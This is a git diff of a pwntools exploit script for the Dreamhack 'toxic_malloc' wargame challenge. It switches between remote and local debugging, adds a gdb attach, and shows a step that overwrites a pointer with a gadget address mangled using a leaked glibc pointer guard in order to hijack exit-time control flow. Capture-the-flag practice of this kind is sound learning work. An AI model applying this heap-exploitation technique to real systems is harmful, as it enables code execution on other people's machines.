@@ -46,12 +46,12 @@ def delete(idx):
 def exit():
   rem.sendlineafter(b'choice:', b"5")
 
-# ld = "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/ld-linux-x86-64.so.2"
-# env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/libc.so.6"}
-# rem = process([ld, "./Pwnable/toxic_malloc/problem/deploy/chall"], env=env)
+ld = "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/ld-linux-x86-64.so.2"
+env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Pwnable/toxic_malloc/problem/deploy/libc.so.6"}
+rem = process(["./Pwnable/toxic_malloc/problem/deploy/chall"], env=env)
 
-port = 31337
-rem = remote("0.0.0.0", port)
+# port = 31337
+# rem = remote("0.0.0.0", port)
 
 lib = ELF("./Pwnable/toxic_malloc/problem/deploy/libc.so.6")
 
@@ -90,8 +90,10 @@ print(hex(pointer_gaurd))
 # print(p64(rol(gadget_addr, 0x11, word_size=64)))
 update(4, p64(4) + p64(rol(gadget_addr, 0x11, word_size=64) ^ pointer_gaurd))
 
+gdb.attach(rem)
+
 exit()
 
 rem.recvline()
 
-# rem.interactive()
+rem.interactive()
